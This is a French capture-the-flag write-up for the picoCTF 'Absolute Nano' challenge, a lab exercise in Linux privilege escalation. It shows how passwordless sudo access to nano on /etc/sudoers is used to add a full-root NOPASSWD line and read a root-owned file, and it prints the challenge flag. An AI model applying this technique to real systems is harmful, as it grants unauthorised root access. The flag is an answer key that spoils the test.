# Writeup PicoCTF - Absolute Nano (Power with Nano)

**Challenge :** Absolute Nano / Power with Nano
**Catégorie :** Privilege Escalation (Linux)
**Points :** 200 pts
**Flag :** `picoCTF{n4n0_411_7h3_w4y_6a5c67f2}`

## Description

Le défi fournit des accès SSH à une instance Linux. L'objectif est de lire un fichier `flag.txt` appartenant à root en exploitant des privilèges sudo mal configurés sur l'éditeur de texte `nano`.

## Étapes de la solution

### 1. Analyse Initiale

Après connexion en SSH, l'énumération des droits de l'utilisateur `ctf-player` via `sudo -l` révèle une configuration vulnérable :

```text
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```

**Analyse :** Nous pouvons modifier le fichier `/etc/sudoers` (qui définit les droits sudo de tous les utilisateurs) en utilisant `nano` avec les privilèges root, sans avoir besoin de mot de passe.

### 2. Escalade de Privilèges

#### Étape A : Correction du Terminal

Si l'ouverture de nano échoue avec une erreur de type `Error opening terminal`, il faut définir une variable `TERM` standard :

```bash
export TERM=xterm
```

#### Étape B : Modification de sudoers

On lance l'édition du fichier de configuration :

```bash
sudo /bin/nano /etc/sudoers
```

À la fin du fichier, on ajoute la ligne suivante pour s'octroyer les droits root complets :

```text
ctf-player ALL=(ALL:ALL) NOPASSWD: ALL
```

* **Sauvegarde :** `Ctrl+O`, puis `Entrée`.
* **Quitter :** `Ctrl+X`.

### 3. Récupération du Flag

Maintenant que `ctf-player` a les pleins pouvoirs sudo, il suffit de lire le fichier protégé :

```bash
sudo cat /root/flag.txt
```

**Résultat :** `picoCTF{n4n0_411_7h3_w4y_6a5c67f2}`

## Concepts clés retenus

* **GTFOBins** : Exploitation de binaires légitimes pour contourner des restrictions.
* **Sudoers Misconfiguration** : Donner un accès en écriture à `/etc/sudoers` (même via un éditeur) équivaut à un accès root complet.
* **Édition de fichiers sensibles** : Toujours privilégier `visudo` qui vérifie la syntaxe, car une erreur dans `/etc/sudoers` peut bloquer tout accès sudo au système.
